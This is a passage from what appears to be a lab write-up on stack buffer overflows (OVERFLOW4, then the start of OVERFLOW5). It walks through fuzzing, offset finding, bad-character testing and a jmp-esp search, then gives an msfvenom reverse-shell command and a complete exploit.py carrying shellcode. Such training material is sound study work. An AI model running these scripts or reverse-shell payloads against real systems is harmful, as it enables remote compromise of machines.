class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Fuzzing crashed at &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(string) - <span class="built_in">len</span>(prefix)))</span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line">string += <span class="number">100</span> * <span class="string">&quot;A&quot;</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fuzzing crashed at 2100 bytes</span><br></pre></td></tr></table></figure><h3 id="offset-4"><a class="markdownIt-Anchor" href="#offset-4"></a> OFFSET</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2100</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># offset.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW4 &quot;</span></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line">overflow = <span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9&quot;</span></span><br><span class="line">retn = <span class="string">&quot;&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>EIP: 70433570 -&gt; pC5p -&gt; p5Cp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q p5Cp -l 2100</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[*] Exact match at offset 2026</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># offset_confirm.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW4 &quot;</span></span><br><span class="line">offset = <span class="number">2026</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>EIP: 42424242 -&gt; BBBB</p><h3 id="badchar-4"><a class="markdownIt-Anchor" href="#badchar-4"></a> BADCHAR</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># charset.py</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">print(<span class="string">&quot;\\x&quot;</span> + <span class="string">&quot;&#123;:02x&#125;&quot;</span>.<span class="built_in">format</span>(x), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># badchar.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW4 &quot;</span></span><br><span class="line">offset = <span class="number">2026</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.</p></blockquote><p>BADCHAR: <code>\x00\xa9\xaa\xcd\xce\xd4\xd5</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># badchar_confirm.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW4 &quot;</span></span><br><span class="line">offset = <span class="number">2026</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa8\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcc\xce\xcf\xd0\xd1\xd2\xd3\xd3\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>去掉BADCHAR<code>\xa9\xcd\xd4</code>之后<code>\xaa\xce\xd5</code>不受影响</p><p>BADCHAR: <code>\x00\xa9\xcd\xd4</code></p><h3 id="jmp-esp-4"><a class="markdownIt-Anchor" href="#jmp-esp-4"></a> JMP ESP</h3><p>Immunity Debugger</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona jmp -r esp -cqb &quot;\x00\xa9\xcd\xd4&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x625011af</span><br><span class="line">0x625011bb</span><br><span class="line">0x625011c7</span><br><span class="line">0x625011d3</span><br><span class="line">0x625011df</span><br><span class="line">0x625011eb</span><br><span class="line">0x625011f7</span><br><span class="line">0x62501203</span><br><span class="line">0x62501205</span><br></pre></td></tr></table></figure><h3 id="shellcode-4"><a class="markdownIt-Anchor" href="#shellcode-4"></a> SHELLCODE</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.17.42.96 LPORT=1337 -b <span class="string">&quot;\x00\xa9\xcd\xd4&quot;</span> -f c</span><br></pre></td></tr></table></figure><h3 id="exploit-4"><a class="markdownIt-Anchor" href="#exploit-4"></a> EXPLOIT</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># exploit.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW4 &quot;</span></span><br><span class="line">offset = <span class="number">2026</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;\xaf\x11\x50\x62&quot;</span></span><br><span class="line">padding = <span class="string">&quot;\x90&quot;</span> * <span class="number">16</span></span><br><span class="line">payload = <span class="string">&quot;\xda\xd5\xb8\x1a\x41\xb8\x79\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x52\x31\x43\x17\x83\xeb\xfc\x03\x59\x52\x5a\x8c\xa1\xbc\x18\x6f\x59\x3d\x7d\xf9\xbc\x0c\xbd\x9d\xb5\x3f\x0d\xd5\x9b\xb3\xe6\xbb\x0f\x47\x8a\x13\x20\xe0\x21\x42\x0f\xf1\x1a\xb6\x0e\x71\x61\xeb\xf0\x48\xaa\xfe\xf1\x8d\xd7\xf3\xa3\x46\x93\xa6\x53\xe2\xe9\x7a\xd8\xb8\xfc\xfa\x3d\x08\xfe\x2b\x90\x02\x59\xec\x13\xc6\xd1\xa5\x0b\x0b\xdf\x7c\xa0\xff\xab\x7e\x60\xce\x54\x2c\x4d\xfe\xa6\x2c\x8a\x39\x59\x5b\xe2\x39\xe4\x5c\x31\x43\x32\xe8\xa1\xe3\xb1\x4a\x0d\x15\x15\x0c\xc6\x19\xd2\x5a\x80\x3d\xe5\x8f\xbb\x3a\x6e\x2e\x6b\xcb\x34\x15\xaf\x97\xef\x34\xf6\x7d\x41\x48\xe8\xdd\x3e\xec\x63\xf3\x2b\x9d\x2e\x9c\x98\xac\xd0\x5c\xb7\xa7\xa3\x6e\x18\x1c\x2b\xc3\xd1\xba\xac\x24\xc8\x7b\x22\xdb\xf3\x7b\x6b\x18\xa7\x2b\x03\x89\xc8\xa7\xd3\x36\x1d\x67\x83\x98\xce\xc8\x73\x59\xbf\xa0\x99\x56\xe0\xd1\xa2\xbc\x89\x78\x59\x57\xbc\x6d\x4b\xc7\xa8\x8f\x8b\x02\x10\x19\x6d\x66\x72\x4f\x26\x1f\xeb\xca\xbc\xbe\xf4\xc0\xb9\x81\x7f\xe7\x3e\x4f\x88\x82\x2c\x38\x78\xd9\x0e\xef\x87\xf7\x26\x73\x15\x9c\xb6\xfa\x06\x0b\xe1\xab\xf9\x42\x67\x46\xa3\xfc\x95\x9b\x35\xc6\x1d\x40\x86\xc9\x9c\x05\xb2\xed\x8e\xd3\x3b\xaa\xfa\x8b\x6d\x64\x54\x6a\xc4\xc6\x0e\x24\xbb\x80\xc6\xb1\xf7\x12\x90\xbd\xdd\xe4\x7c\x0f\x88\xb0\x83\xa0\x5c\x35\xfc\xdc\xfc\xba\xd7\x64\x0c\xf1\x75\xcc\x85\x5c\xec\x4c\xc8\x5e\xdb\x93\xf5\xdc\xe9\x6b\x02\xfc\x98\x6e\x4e\xba\x71\x03\xdf\x2f\x75\xb0\xe0\x65&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="overflow5"><a class="markdownIt-Anchor" href="#overflow5"></a> OVERFLOW5</h2><h3 id="fuzz-5"><a class="markdownIt-Anchor" href="#fuzz-5"></a> FUZZ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># fuzz.py</span></span><br><span class="line"><span class="keyword">import</span> socket, time, sys</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line"></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">timeout = <span class="number">5</span></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW5 &quot;</span></span><br><span class="line"></span><br><span class="line">string = prefix + <span class="string">&quot;A&quot;</span> * <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">s.settimeout(timeout)</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">print(<span class="string">&quot;Fuzzing with &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(string) - <span class="built_in">len</span>(prefix)))</span><br><span class="line">s.send(<span class="built_in">bytes</span>(string, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Fuzzing crashed at &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(string) - <span class="built_in">len</span>(prefix)))</span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line">string += <span class="number">100</span> * <span class="string">&quot;A&quot;</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fuzzing crashed at 400 bytes</span><br></pre></td></tr></table></figure><h3 id="offset-5"><a class="markdownIt-Anchor" href="#offset-5"></a> OFFSET</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 